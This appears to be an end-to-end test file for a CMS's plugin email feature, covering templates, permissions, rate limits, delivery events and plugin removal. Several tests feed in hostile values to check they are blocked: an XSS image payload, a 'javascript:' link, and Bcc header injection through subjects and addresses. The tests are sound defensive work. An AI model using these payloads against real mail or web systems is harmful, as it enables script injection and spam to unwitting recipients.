/**
 * Email for plugins, end to end: a real plugin package installed through the
 * cms handler, running in its sandboxed worker, against a real database.
 *
 * Covers declaring templates, sending one to a member and to an address, the
 * permission each needs, what a hostile value can and cannot do, the limits,
 * the outcome events, the owner's edits across an upgrade, and what
 * disabling and uninstalling leave behind.
 */
import { afterEach, beforeEach, describe, expect, it } from 'bun:test'
import { mkdtemp, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { strToU8, zipSync } from 'fflate'
import {
  getMailTemplateDefinition,
  listMailTemplateDefinitions,
  renderMailTemplate,
  sampleMailVariables,
  type MailConnector,
  type MailTemplate,
} from '@core/mail'
import { hookBus } from '@core/plugins/hookBus'
import { parsePluginManifest } from '@core/plugins/manifest'
import { undeclaredMailVariables } from '@core/plugins/manifestMail'
import { configurePublicOrigins, resetPublicOrigins } from '../../../server/auth/security'
import { handleCmsRequest } from '../../../server/handlers/cms'
import { listMailActivity, recordMail } from '../../../server/mail/activity'
import { createMailConnector } from '../../../server/mail/connectors'
import { saveMailDefaults } from '../../../server/mail/defaults'
import { __resetMailQueuePauseForTesting, drainMailQueue, queueTemplateMail } from '../../../server/mail/delivery'
import { MAIL_BACKLOG_LIMIT, MAIL_EXTERNAL_HOURLY_LIMIT, MailLimitError } from '../../../server/mail/limits'
import type { MailCarrier } from '../../../server/mail/send'
import { MailDeliveryError } from '../../../server/mail/smtpDriver'
import { deleteMemberAsAdmin } from '../../../server/members/admin'
import { createMember } from '../../../server/members/repository'
import { handleServerRequest } from '../../../server/router'
import { createCapabilityTestHarness, readJson, type CapabilityTestHarness } from '../helpers/capabilityHarness'

const ORIGIN = 'http://localhost'
const PLUGIN_ID = 'acme.desk'
const MOUNT = `/_instatic/plugins/${PLUGIN_ID}`
const BASE = ['cms.routes', 'cms.routes.public', 'cms.hooks']
const BOTH = [...BASE, 'mail.send', 'mail.send.external']
const REPLY_KEY = `plugin.${PLUGIN_ID}~ticket.reply`

const PLUGIN_SOURCE = `
  export function activate(api) {
    const heard = []
    for (const event of ['mail.delivered', 'mail.failed']) {
      api.cms.hooks.on(event, (payload) => { heard.push({ event, ...payload }) })
    }
    api.cms.routes.public.get('/heard', () => ({ heard }))
    api.cms.routes.public.get('/site', async () => ({ url: await api.cms.site.publicUrl() }))
    api.cms.routes.public.post('/send', async (ctx) => {
      try {
        return { status: await api.cms.mail.send(ctx.body) }
      } catch (err) {
        return { error: String(err && err.message ? err.message : err) }
      }
    })
  }
`

const TEMPLATES = [
  {
    key: 'ticket.reply',
    label: 'Ticket reply',
    description: 'Sent to the customer when the team answers a ticket.',
    variables: [
      { name: 'subject', label: 'Ticket subject', sample: 'Publishing stops at 80%' },
      { name: 'link', label: 'Link to the ticket', sample: 'https://example.com/account/support/1042' },
    ],
    subject: 'Re: {subject}',
    body: 'We answered **{subject}**.\n\n[Open the ticket]({link})',
  },
  {
    key: 'ticket.opened',
    label: 'New ticket',
    description: 'Sent to the support inbox when a customer opens a ticket.',
    variables: [{ name: 'subject', label: 'Ticket subject', sample: 'Publishing stops at 80%' }],
    subject: 'New ticket: {subject}',
    body: 'A customer opened **{subject}**.',
  },
]

function manifest(permissions: string[], overrides: Record<string, unknown> = {}) {
  return {
    id: PLUGIN_ID,
    name: 'Help Desk',
    version: '1.0.0',
    apiVersion: 1,
    permissions,
    entrypoints: { server: 'server/index.js' },
    resources: [],
    adminPages: [],
    mail: { templates: TEMPLATES },
    ...overrides,
  }
}

describe('email for plugins', () => {
  let h: CapabilityTestHarness
  let owner: string
  let uploadsDir: string
  let now = 0

  beforeEach(async () => {
    uploadsDir = await mkdtemp(join(tmpdir(), 'plugin-mail-'))
    h = await createCapabilityTestHarness({ uploadsDir })
    owner = await h.setupOwner()
    hookBus.reset()
    resetPublicOrigins()
    __resetMailQueuePauseForTesting()
    now = Date.now() + 5_000
  })

  afterEach(async () => {
    resetPublicOrigins()
    await h.cleanup()
    await rm(uploadsDir, { recursive: true, force: true })
  })

  const install = (permissions: string[], overrides: Record<string, unknown> = {}) =>
    installPackage(manifest(permissions, overrides), permissions)

  async function installPackage(pluginManifest: unknown, granted: string[], source = PLUGIN_SOURCE): Promise<Response> {
    const zipped = zipSync({
      'plugin.json': strToU8(JSON.stringify(pluginManifest)),
      'server/index.js': strToU8(source),
    })
    const formData = new FormData()
    formData.set('file', new File([zipped], 'plugin.zip', { type: 'application/zip' }))
    formData.set('grantedPermissions', JSON.stringify(granted))
    const req = {
      url: `${ORIGIN}/admin/api/cms/plugins/package`,
      method: 'POST',
      headers: { get: (name: string) => (name.toLowerCase() === 'cookie' ? owner : null) },
      formData: async () => formData,
    } as unknown as Request
    return handleCmsRequest(req, h.db, { uploadsDir })
  }

  async function call(path: string, json?: unknown): Promise<Record<string, unknown>> {
    const req = new Request(`${ORIGIN}${MOUNT}${path}`, {
      method: json === undefined ? 'GET' : 'POST',
      ...(json !== undefined ? { body: JSON.stringify(json) } : {}),
    })
    if (json !== undefined) {
      req.headers.set('content-type', 'application/json')
      req.headers.set('origin', ORIGIN)
    }
    const res = await handleServerRequest(req, { db: h.db, uploadsDir })
    return (await res.json()) as Record<string, unknown>
  }

  const send = (body: unknown) => call('/send', body)

  const setEnabled = (enabled: boolean) =>
    h.cms(`/admin/api/cms/plugins/${PLUGIN_ID}`, { method: 'PATCH', cookie: owner, json: { enabled } })

  /** What the plugin heard, once the listeners (which nothing waits for) have run. */
  async function heard(): Promise<unknown> {
    await new Promise((resolve) => setTimeout(resolve, 50))
    return (await call('/heard')).heard
  }

  /** How many times `key` was missing from the catalogue while `work` ran. */
  async function timesMissing(key: string, work: Promise<unknown>): Promise<number> {
    let missing = 0
    let done = false
    void work.finally(() => { done = true })
    while (!done) {
      if (!getMailTemplateDefinition(key)) missing += 1
      await new Promise((resolve) => setImmediate(resolve))
    }
    await work
    return missing
  }

  async function readyConnector(): Promise<MailConnector> {
    const { rows } = await h.db<{ id: string }>`select id from users limit 1`
    const connector = await createMailConnector(
      h.db,
      { kind: 'smtp', label: 'Relay', config: { host: 'smtp.example.com', port: 587, username: 'mailer' }, secret: 's' },
      rows[0].id,
    )
    await saveMailDefaults(
      h.db,
      { defaultConnectorId: connector.id, fromAddress: 'hello@example.com', fromName: 'Example', replyTo: '' },
      rows[0].id,
    )
    return connector
  }

  const drain = (carrier: MailCarrier) => drainMailQueue(h.db, { carrier, now: () => now, random: () => 0.5, paceMs: 0 })

  async function activeMember(email = 'ada@example.com'): Promise<string> {
    const created = await createMember(h.db, { email, passwordHash: 'x', profile: {}, verified: true })
    return created!.id
  }

  async function templates(): Promise<MailTemplate[]> {
    const res = await h.cms('/admin/api/cms/mail/templates', { cookie: owner })
    return (await readJson<{ templates: MailTemplate[] }>(res)).templates
  }

  describe('the manifest', () => {
    it('refuses templates without a mail permission, duplicate keys and the site\'s own variables', () => {
      expect(() => parsePluginManifest(manifest(BASE))).toThrow('neither the `mail.send` nor the `mail.send.external`')
      expect(() => parsePluginManifest(manifest(BOTH, { mail: { templates: [TEMPLATES[0], TEMPLATES[0]] } })))
        .toThrow('declared twice')
      const stealsSite = { ...TEMPLATES[1], variables: [{ name: 'site.name', label: 'Site', sample: 'x' }] }
      expect(() => parsePluginManifest(manifest(BOTH, { mail: { templates: [stealsSite] } }))).toThrow('filled in by the site')
    })

    it('refuses a subject that spans lines and an empty list, and drops a field it does not know', () => {
      const twoLines = { ...TEMPLATES[0], subject: 'Hi\nBcc: someone@example.com' }
      expect(() => parsePluginManifest(manifest(BOTH, { mail: { templates: [twoLines] } }))).toThrow()
      expect(() => parsePluginManifest(manifest(BOTH, { mail: { templates: [] } }))).toThrow()
      // A plugin cannot smuggle in a sender or a header: unknown fields never reach the host.
      const parsed = parsePluginManifest(manifest(BOTH, { mail: { templates: [{ ...TEMPLATES[0], from: 'x@example.com' }] } }))
      expect(parsed.mail?.templates[0]).not.toHaveProperty('from')
    })

    it('tells the lint which names a template uses without declaring them', () => {
      expect(undeclaredMailVariables(TEMPLATES[0])).toEqual([])
      expect(undeclaredMailVariables({ ...TEMPLATES[0], body: '{link} {tikcet} {site.name}' })).toEqual(['tikcet'])
    })
  })

  describe('templates in the Email workspace', () => {
    it('lists a loaded plugin\'s templates under its name, with samples, and sends a test of one', async () => {
      expect((await install(BOTH)).status).toBe(201)
      const listed = (await templates()).filter((template) => template.group === 'Help Desk')
      expect(listed.map((template) => template.key).sort()).toEqual([`plugin.${PLUGIN_ID}~ticket.opened`, REPLY_KEY])
      expect(listed.find((template) => template.key === REPLY_KEY)).toMatchObject({
        label: 'Ticket reply', subject: 'Re: {subject}', customised: false,
      })

      const test = await h.cms(`/admin/api/cms/mail/templates/${REPLY_KEY}/test`, {
        method: 'POST', cookie: owner, json: { to: 'owner@example.com' },
      })
      expect(test.status).toBe(200)
      expect((await listMailActivity(h.db)).entries[0]).toMatchObject({
        kind: REPLY_KEY, kindLabel: 'Ticket reply', subject: 'Re: Publishing stops at 80%',
      })
    })

    it('keeps the owner\'s wording across an upgrade and uses it when the plugin sends', async () => {
      await install(BOTH)
      const put = await h.cms(`/admin/api/cms/mail/templates/${REPLY_KEY}`, {
        method: 'PUT', cookie: owner, json: { subject: 'Answer: {subject}', body: 'Our words. [Ticket]({link})' },
      })
      expect(put.status).toBe(200)

      expect((await install(BOTH, { version: '1.1.0' })).status).toBeLessThan(300)
      expect((await templates()).find((template) => template.key === REPLY_KEY)).toMatchObject({
        subject: 'Answer: {subject}', customised: true,
      })

      const memberId = await activeMember()
      expect(await send({ template: 'ticket.reply', to: { member: memberId }, variables: { subject: 'Hello', link: 'https://example.com/t/1' } }))
        .toEqual({ status: 'captured' })
      expect((await listMailActivity(h.db)).entries[0]).toMatchObject({ subject: 'Answer: Hello', to: 'ada@example.com' })
    })

    it('takes the templates out while the plugin is disabled and deletes the edits on uninstall', async () => {
      await install(BOTH)
      await h.cms(`/admin/api/cms/mail/templates/${REPLY_KEY}`, {
        method: 'PUT', cookie: owner, json: { subject: 'Edited', body: 'Edited' },
      })
      const disabled = await h.cms(`/admin/api/cms/plugins/${PLUGIN_ID}`, { method: 'PATCH', cookie: owner, json: { enabled: false } })
      expect(disabled.status).toBe(200)
      expect(getMailTemplateDefinition(REPLY_KEY)).toBeUndefined()
      expect((await templates()).some((template) => template.key === REPLY_KEY)).toBe(false)
      // The edit waits for the plugin to come back.
      expect((await h.db`select template_key from mail_templates`).rows).toHaveLength(1)

      const removed = await h.cms(`/admin/api/cms/plugins/${PLUGIN_ID}`, { method: 'DELETE', cookie: owner })
      expect(removed.status).toBe(200)
      expect((await h.db`select template_key from mail_templates`).rows).toHaveLength(0)
    })
  })

  describe('sending', () => {
    it('queues a template for a member, whose address the host looks up, and for an address', async () => {
      await install(BOTH)
      await readyConnector()
      const memberId = await activeMember()
      expect(await send({ template: 'ticket.reply', to: { member: memberId }, variables: { subject: 'Hi', link: 'https://example.com/t/1' }, reference: 'ticket-1' }))
        .toEqual({ status: 'queued' })
      expect(await send({ template: 'ticket.opened', to: { address: 'support@example.com' }, variables: { subject: 'Hi' } }))
        .toEqual({ status: 'queued' })

      const { rows } = await h.db<{ to_address: string; source: string; lane: number; reference: string | null }>`
        select to_address, source, lane, reference from mail_queue order by outbox_id
      `
      expect(rows).toEqual([
        { to_address: 'ada@example.com', source: PLUGIN_ID, lane: 1, reference: 'ticket-1' },
        { to_address: 'support@example.com', source: PLUGIN_ID, lane: 1, reference: null },
      ])

      const carried: Array<{ to: string; subject: string; text: string }> = []
      await drain(async (_c, _s, mail) => { carried.push({ to: mail.to, subject: mail.subject, text: mail.text }); return null })
      expect(carried.map((mail) => `${mail.to} | ${mail.subject}`)).toEqual([
        'ada@example.com | Re: Hi',
        'support@example.com | New ticket: Hi',
      ])
      expect(carried[0].text).toContain('https://example.com/t/1')
    })

    it('needs mail.send for a member and mail.send.external for an address', async () => {
      await install([...BASE, 'mail.send'])
      const memberId = await activeMember()
      expect(await send({ template: 'ticket.reply', to: { member: memberId }, variables: { subject: 'a', link: 'https://example.com/' } }))
        .toEqual({ status: 'captured' })
      const refused = await send({ template: 'ticket.opened', to: { address: 'support@example.com' }, variables: { subject: 'a' } })
      expect(String(refused.error)).toContain('mail.send.external')
    })

    it('needs mail.send even when the plugin may write to any address', async () => {
      await install([...BASE, 'mail.send.external'])
      const memberId = await activeMember()
      const refused = await send({ template: 'ticket.reply', to: { member: memberId }, variables: { subject: 'a', link: 'https://example.com/' } })
      expect(String(refused.error)).toContain('"mail.send"')
    })

    it('refuses a template it does not declare, another plugin\'s and the core\'s, and an undeclared variable', async () => {
      await install(BOTH)
      const to = { address: 'someone@example.com' }
      expect(String((await send({ template: 'nope', to })).error)).toContain('not an email template this plugin declares')
      expect(String((await send({ template: 'member.reset', to, variables: { link: 'https://evil.example/' } })).error))
        .toContain('not an email template this plugin declares')
      expect(String((await send({ template: 'plugin.other.plugin.welcome', to })).error))
        .toContain('not an email template this plugin declares')
      expect(String((await send({ template: 'ticket.opened', to, variables: { subject: 'a', 'site.name': 'Bank' } })).error))
        .toContain('no variable named "site.name"')
      expect((await listMailActivity(h.db)).entries).toHaveLength(0)
    })

    it('refuses a deleted, suspended or unknown member, a bad address and a recipient of neither kind', async () => {
      await install(BOTH)
      const suspended = await activeMember('s@example.com')
      await h.db`update members set status = 'suspended' where id = ${suspended}`
      const variables = { subject: 'a', link: 'https://example.com/' }
      expect(String((await send({ template: 'ticket.reply', to: { member: suspended }, variables })).error)).toContain('cannot be emailed')
      expect(String((await send({ template: 'ticket.reply', to: { member: 'nobody' }, variables })).error)).toContain('cannot be emailed')
      for (const address of ['not-an-address', 'a@example.com, b@example.com', 'a@example.com\nBcc: b@example.com']) {
        expect((await send({ template: 'ticket.opened', to: { address }, variables: { subject: 'a' } })).error).toBeDefined()
      }
      expect(String((await send({ template: 'ticket.opened', to: {}, variables: { subject: 'a' } })).error)).toContain('needs `to')
      expect(String((await send({ template: 'ticket.opened', to: { member: 'x', address: 'a@example.com' }, variables: { subject: 'a' } })).error))
        .toContain('needs `to')
      expect((await listMailActivity(h.db)).entries).toHaveLength(0)
    })

    it('answers the same for a member that never was, was deleted or is suspended, and checks the request first', async () => {
      await install(BOTH)
      const active = await activeMember()
      const suspended = await activeMember('s@example.com')
      await h.db`update members set status = 'suspended' where id = ${suspended}`
      const deleted = await activeMember('d@example.com')
      await deleteMemberAsAdmin(h.db, deleted)
      const variables = { subject: 'a', link: 'https://example.com/' }
      const refusals = await Promise.all(
        [suspended, deleted, 'nobody'].map((member) => send({ template: 'ticket.reply', to: { member }, variables })),
      )
      expect(new Set(refusals.map((refusal) => JSON.stringify(refusal))).size).toBe(1)

      // A bad request is refused for what is wrong with it, before anyone is looked up.
      for (const bad of [{ template: 'nope', variables }, { template: 'ticket.reply', variables: { ...variables, extra: 'x' } }]) {
        const answers = await Promise.all([active, suspended, 'nobody'].map((member) => send({ ...bad, to: { member } })))
        expect(new Set(answers.map((answer) => JSON.stringify(answer))).size).toBe(1)
        expect(String(answers[0].error)).not.toContain('cannot be emailed')
      }
    })

    it('does not write to a member who was suspended or deleted after the email was queued', async () => {
      await install(BOTH)
      await readyConnector()
      const variables = { subject: 'a', link: 'https://example.com/' }
      const suspended = await activeMember('s@example.com')
      const deleted = await activeMember('d@example.com')
      await send({ template: 'ticket.reply', to: { member: suspended }, variables, reference: 'suspended' })
      await send({ template: 'ticket.reply', to: { member: deleted }, variables, reference: 'deleted' })

      await deleteMemberAsAdmin(h.db, deleted)
      // Gone from the queue at once, not at the next attempt.
      expect((await h.db`select id from mail_queue where member_id = ${deleted}`).rows).toHaveLength(0)
      await h.db`update members set status = 'suspended' where id = ${suspended}`
      let calls = 0
      await drain(async () => { calls += 1; return null })
      expect(calls).toBe(0)
      expect((await h.db`select id from mail_queue`).rows).toHaveLength(0)
      expect(await heard()).toEqual([
        { event: 'mail.failed', template: 'ticket.reply', to: { member: deleted }, reference: 'deleted', reason: 'recipient_unavailable' },
        { event: 'mail.failed', template: 'ticket.reply', to: { member: suspended }, reference: 'suspended', reason: 'recipient_unavailable' },
      ])
    })

    it('keeps a hostile value from adding markup, a header or a link of its own', async () => {
      await install(BOTH)
      await readyConnector()
      const memberId = await activeMember()
      expect(await send({
        template: 'ticket.reply',
        to: { member: memberId },
        variables: { subject: '<img src=x onerror=alert(1)> **bold**\r\nBcc: evil@example.com', link: 'javascript:alert(1)' },
      })).toEqual({ status: 'queued' })
      let subject = ''
      let html = ''
      await drain(async (_c, _s, mail) => { subject = mail.subject; html = mail.html ?? ''; return null })
      expect(subject).not.toMatch(/[\r\n]/)
      expect(html).not.toContain('<img')
      expect(html).not.toContain('<strong>bold')
      expect(html).not.toContain('javascript:')
      expect(html).toContain('href="#"')
    })

    it('says so when email is not set up on a production server', async () => {
      await install(BOTH)
      const before = process.env.NODE_ENV
      process.env.NODE_ENV = 'production'
      try {
        expect(String((await send({ template: 'ticket.opened', to: { address: 'a@example.com' }, variables: { subject: 'a' } })).error))
          .toContain('Email is not set up')
      } finally {
        process.env.NODE_ENV = before
      }
    })
  })

  describe('limits', () => {
    const hour = () => new Date().toISOString().slice(0, 13)
    const counter = async (scope: string, bucket: string) => {
      const { rows } = await h.db<{ count: number }>`
        select count from mail_counters where source = ${PLUGIN_ID} and scope = ${scope} and bucket = ${bucket}
      `
      return rows[0] ? Number(rows[0].count) : null
    }
    const attempt = (to: string) =>
      queueTemplateMail(h.db, {
        key: `plugin.${PLUGIN_ID}~ticket.opened`, to, variables: { subject: 'a' }, source: PLUGIN_ID,
      }).then((status) => status, (err: unknown) => (err instanceof MailLimitError ? 'refused' : 'error'))

    it('stops at twenty emails to one recipient in a clock hour, per plugin and without regard to case', async () => {
      await install(BOTH)
      const mail = { template: 'ticket.opened', variables: { subject: 'a' } }
      for (let index = 0; index < 20; index += 1) {
        const to = { address: index % 2 === 0 ? 'Busy@Example.com' : 'busy@example.com' }
        expect(await send({ ...mail, to })).toEqual({ status: 'captured' })
      }
      expect(String((await send({ ...mail, to: { address: 'busy@example.com' } })).error))
        .toContain('20 emails to that recipient this hour')
      expect(await counter('to:busy@example.com', hour())).toBe(20)
      expect(await send({ ...mail, to: { address: 'calm@example.com' } })).toEqual({ status: 'captured' })
      expect((await listMailActivity(h.db)).matching).toBe(21)
    })

    it('accepts exactly twenty of forty sends made at once', async () => {
      await install(BOTH)
      await readyConnector()
      const results = await Promise.all(Array.from({ length: 40 }, () => attempt('rush@example.com')))
      expect(results.filter((result) => result === 'queued')).toHaveLength(20)
      expect(results.filter((result) => result === 'refused')).toHaveLength(20)
      expect((await h.db`select id from mail_queue`).rows).toHaveLength(20)
      // A refused send took no place in the backlog and left no row in the log.
      expect(await counter('backlog', '')).toBe(20)
      expect((await listMailActivity(h.db)).matching).toBe(20)
    })

    it('stops a plugin at two hundred emails an hour to addresses, however many arrive at once, and leaves member email alone', async () => {
      await install(BOTH)
      const results = await Promise.all(
        Array.from({ length: MAIL_EXTERNAL_HOURLY_LIMIT + 60 }, (_unused, index) => attempt(`person${index}@example.com`)),
      )
      expect(results.filter((result) => result === 'captured')).toHaveLength(MAIL_EXTERNAL_HOURLY_LIMIT)
      expect(results.filter((result) => result === 'refused')).toHaveLength(60)
      expect(await counter('external', hour())).toBe(MAIL_EXTERNAL_HOURLY_LIMIT)

      const refused = await send({ template: 'ticket.opened', to: { address: 'one.more@example.com' }, variables: { subject: 'a' } })
      expect(String(refused.error)).toContain(`${MAIL_EXTERNAL_HOURLY_LIMIT} emails to addresses outside the site's members this hour`)
      const memberId = await activeMember()
      expect(await send({ template: 'ticket.reply', to: { member: memberId }, variables: { subject: 'a', link: 'https://example.com/' } }))
        .toEqual({ status: 'captured' })
    })

    it('forgets the hours that are over', async () => {
      await install(BOTH)
      await h.db`insert into mail_counters (source, scope, bucket, count) values (${PLUGIN_ID}, 'to:old@example.com', '2020-01-01T00', 20)`
      expect(await send({ template: 'ticket.opened', to: { address: 'old@example.com' }, variables: { subject: 'a' } }))
        .toEqual({ status: 'captured' })
      expect(await counter('to:old@example.com', '2020-01-01T00')).toBeNull()
    })

    it('stops when the plugin has ten thousand emails waiting, however many arrive at once', async () => {
      await install(BOTH)
      await readyConnector()
      await h.db`insert into mail_counters (source, scope, bucket, count) values (${PLUGIN_ID}, 'backlog', '', ${MAIL_BACKLOG_LIMIT - 10})`
      const results = await Promise.all(Array.from({ length: 30 }, (_, index) => attempt(`r${index}@example.com`)))
      expect(results.filter((result) => result === 'queued')).toHaveLength(10)
      expect(results.filter((result) => result === 'refused')).toHaveLength(20)
      expect(await counter('backlog', '')).toBe(MAIL_BACKLOG_LIMIT)
      expect(String((await send({ template: 'ticket.opened', to: { address: 'late@example.com' }, variables: { subject: 'a' } })).error))
        .toContain('10,000 emails waiting')
      // A refusal for the backlog gives the recipient's place back too: nothing was accepted.
      expect(await counter('to:late@example.com', hour())).toBeNull()
    })

    it('gives a place in the backlog back when an email leaves the queue, sent or failed', async () => {
      await install(BOTH)
      await readyConnector()
      await send({ template: 'ticket.opened', to: { address: 'ok@example.com' }, variables: { subject: 'a' } })
      await send({ template: 'ticket.opened', to: { address: 'bad@example.com' }, variables: { subject: 'a' } })
      expect(await counter('backlog', '')).toBe(2)
      await drain(async (_c, _s, mail) => {
        if (mail.to === 'bad@example.com') throw new MailDeliveryError('Rejected.')
        return null
      })
      expect(await counter('backlog', '')).toBe(0)
    })
  })

  describe('outcome events', () => {
    it('tells the plugin, and only that plugin, what became of its email', async () => {
      await install(BOTH)
      await readyConnector()
      const elsewhere: unknown[] = []
      hookBus.on('other.plugin', 'mail.delivered', async (payload) => { elsewhere.push(payload) })
      hookBus.on('other.plugin', 'mail.failed', async (payload) => { elsewhere.push(payload) })

      await send({ template: 'ticket.opened', to: { address: 'ok@example.com' }, variables: { subject: 'a' }, reference: 'r-ok' })
      await send({ template: 'ticket.opened', to: { address: 'bad@example.com' }, variables: { subject: 'a' }, reference: 'r-bad' })
      await drain(async (_c, _s, mail) => {
        if (mail.to === 'bad@example.com') throw new MailDeliveryError('The SMTP server rejected the recipient address.')
        return null
      })
      await new Promise((resolve) => setTimeout(resolve, 50))

      const { heard } = await call('/heard')
      expect(heard).toEqual([
        { event: 'mail.delivered', template: 'ticket.opened', to: { address: 'ok@example.com' }, reference: 'r-ok' },
        // A fixed code: the provider's sentence stays in the admin's Activity.
        { event: 'mail.failed', template: 'ticket.opened', to: { address: 'bad@example.com' }, reference: 'r-bad', reason: 'recipient_rejected' },
      ])
      expect(elsewhere).toEqual([])
      expect((await listMailActivity(h.db, { status: 'failed' })).entries[0].error)
        .toBe('The SMTP server rejected the recipient address.')
    })

    it('never hands a member\'s address to the plugin that emailed them by id', async () => {
      // No `members.read`: this plugin was never entitled to the address.
      await install([...BASE, 'mail.send'])
      await readyConnector()
      const reached = await activeMember('private.person@example.com')
      const bounced = await activeMember('bounces@example.com')
      const variables = { subject: 'a', link: 'https://example.com/t' }
      expect(await send({ template: 'ticket.reply', to: { member: reached }, variables, reference: 'r1' })).toEqual({ status: 'queued' })
      expect(await send({ template: 'ticket.reply', to: { member: bounced }, variables, reference: 'r2' })).toEqual({ status: 'queued' })
      await drain(async (_c, _s, mail) => {
        // A provider's own reason can quote the recipient, in any case.
        if (mail.to === 'bounces@example.com') {
          throw new MailDeliveryError('Resend refused the message (HTTP 422). Invalid `to` field: Bounces@Example.com')
        }
        return null
      })
      await new Promise((resolve) => setTimeout(resolve, 50))

      const { heard } = await call('/heard')
      expect(heard).toEqual([
        { event: 'mail.delivered', template: 'ticket.reply', to: { member: reached }, reference: 'r1' },
        { event: 'mail.failed', template: 'ticket.reply', to: { member: bounced }, reference: 'r2', reason: 'recipient_rejected' },
      ])
      // No part of the provider's sentence reaches the plugin: not the address, its local part or its domain.
      expect(JSON.stringify(heard)).not.toContain('Resend')
      expect(JSON.stringify(heard).toLowerCase()).not.toContain('bounces')
      expect(JSON.stringify(heard).toLowerCase()).not.toContain('example.com')

      // Refusals do not carry it either.
      await h.db`update members set status = 'suspended' where id = ${reached}`
      const refused = await send({ template: 'ticket.reply', to: { member: reached }, variables })
      expect(JSON.stringify(refused)).not.toContain('private.person')
      for (let index = 0; index < 19; index += 1) {
        await send({ template: 'ticket.reply', to: { member: bounced }, variables })
      }
      const limited = await send({ template: 'ticket.reply', to: { member: bounced }, variables })
      expect(String(limited.error)).toContain('this hour')
      expect(JSON.stringify(limited)).not.toContain('bounces')
    })

    it('counts a member and an address apart, so a refusal cannot tell which address a member has', async () => {
      await install(BOTH)
      const memberId = await activeMember('secret.inbox@example.com')
      const toMember = { template: 'ticket.reply', to: { member: memberId }, variables: { subject: 'a', link: 'https://example.com/t' } }
      const toAddress = { template: 'ticket.opened', to: { address: 'secret.inbox@example.com' }, variables: { subject: 'a' } }
      for (let index = 0; index < 20; index += 1) expect(await send(toMember)).toEqual({ status: 'captured' })
      expect(String((await send(toMember)).error)).toContain('this hour')

      // The member's places are used up; the address's are untouched, as for any other address.
      expect(await send(toAddress)).toEqual({ status: 'captured' })
      expect(await send({ ...toAddress, to: { address: 'someone.else@example.com' } })).toEqual({ status: 'captured' })
      const { rows } = await h.db<{ scope: string; count: number }>`
        select scope, count from mail_counters where source = ${PLUGIN_ID} order by scope
      `
      expect(rows.map((row) => `${row.scope}=${Number(row.count)}`)).toEqual([
        // Email to addresses is also counted per plugin; email to members is not.
        'external=2',
        `member:${memberId}=20`,
        'to:secret.inbox@example.com=1',
        'to:someone.else@example.com=1',
      ])
    })

    it('reports an email that ran out of time as expired and a removed template as template_removed', async () => {
      await install(BOTH)
      await readyConnector()
      // First a template that is gone by the time the email is sent.
      await send({ template: 'ticket.opened', to: { address: 'gone@example.com' }, variables: { subject: 'a' }, reference: 'gone' })
      await h.db`update mail_queue set kind = ${`plugin.${PLUGIN_ID}~no.longer.declared`}`
      await drain(async () => null)

      // Then a provider that stays down past the email's day.
      await send({ template: 'ticket.opened', to: { address: 'slow@example.com' }, variables: { subject: 'a' }, reference: 'slow' })
      const down: MailCarrier = async () => {
        throw new MailDeliveryError('Could not reach the provider at smtp.example.com.', { retry: 'later' })
      }
      for (let round = 0; round < 40 && (await h.db`select id from mail_queue`).rows.length > 0; round += 1) {
        await drain(down)
        now += 8 * 60 * 60 * 1000
      }
      await new Promise((resolve) => setTimeout(resolve, 50))

      const { heard } = await call('/heard')
      expect(heard).toEqual([
        { event: 'mail.failed', template: 'no.longer.declared', to: { address: 'gone@example.com' }, reference: 'gone', reason: 'template_removed' },
        { event: 'mail.failed', template: 'ticket.opened', to: { address: 'slow@example.com' }, reference: 'slow', reason: 'expired' },
      ])
    })
  })

  describe('a plugin that goes away', () => {
    it('keeps what a disabled plugin left waiting and sends it once the plugin is back', async () => {
      await install(BOTH)
      await readyConnector()
      await send({ template: 'ticket.opened', to: { address: 'a@example.com' }, variables: { subject: 'a' }, reference: 'kept' })
      await setEnabled(false)
      let calls = 0
      const carrier: MailCarrier = async () => { calls += 1; return null }
      await drain(carrier)
      expect(calls).toBe(0)
      expect((await listMailActivity(h.db)).entries[0]).toMatchObject({
        status: 'queued', error: 'Waiting: the plugin that sends this email is not active.', sentBy: 'Help Desk',
      })

      await setEnabled(true)
      now += 60 * 60 * 1000
      await drain(carrier)
      expect(calls).toBe(1)
      expect((await listMailActivity(h.db)).entries[0]).toMatchObject({ status: 'sent' })
      expect(await heard()).toEqual([
        { event: 'mail.delivered', template: 'ticket.opened', to: { address: 'a@example.com' }, reference: 'kept' },
      ])
    })

    it('gives up on a disabled plugin\'s email at its deadline, and tells the plugin when it is back', async () => {
      await install(BOTH)
      await readyConnector()
      await send({ template: 'ticket.opened', to: { address: 'a@example.com' }, variables: { subject: 'a' }, reference: 'late' })
      await setEnabled(false)
      now += 25 * 60 * 60 * 1000
      await drain(async () => null)
      expect((await listMailActivity(h.db)).entries[0]).toMatchObject({ status: 'failed' })

      // Nobody was listening when it failed. The news waited.
      await setEnabled(true)
      expect(await heard()).toEqual([
        { event: 'mail.failed', template: 'ticket.opened', to: { address: 'a@example.com' }, reference: 'late', reason: 'expired' },
      ])
    })

    it('tells a new install of the same id nothing about the email of the one before it', async () => {
      await install(BOTH)
      await readyConnector()
      const remove = () => h.cms(`/admin/api/cms/plugins/${PLUGIN_ID}`, { method: 'DELETE', cookie: owner })

      // News held for an install that is then removed.
      await send({ template: 'ticket.opened', to: { address: 'a@example.com' }, variables: { subject: 'a' }, reference: 'held-for-the-old-one' })
      await setEnabled(false)
      now += 25 * 60 * 60 * 1000
      await drain(async () => null)
      await new Promise((resolve) => setTimeout(resolve, 50))
      await remove()
      expect((await install(BOTH)).status).toBe(201)
      expect(await heard()).toEqual([])

      // An email the old install had with the provider when it was replaced.
      now = Date.now() + 5_000
      const memberId = await activeMember()
      await send({ template: 'ticket.reply', to: { member: memberId }, variables: { subject: 'a', link: 'https://example.com/' }, reference: 'in-flight' })
      let carried = 0
      await drain(async () => {
        carried += 1
        await remove()
        await new Promise((resolve) => setTimeout(resolve, 5))
        expect((await install(BOTH)).status).toBe(201)
        return null
      })
      expect(carried).toBe(1)
      expect(await heard()).toEqual([])

      // Its own email it does hear about.
      await send({ template: 'ticket.opened', to: { address: 'b@example.com' }, variables: { subject: 'a' }, reference: 'mine' })
      await drain(async () => null)
      expect(await heard()).toEqual([
        { event: 'mail.delivered', template: 'ticket.opened', to: { address: 'b@example.com' }, reference: 'mine' },
      ])
    })

    it('never leaves a template missing while another plugin is removed or the plugin itself is upgraded', async () => {
      await install(BOTH)
      await readyConnector()
      expect((await installPackage({ ...manifest(BOTH), id: 'acme.other', name: 'Other' }, BOTH, 'export function activate() {}')).status).toBe(201)
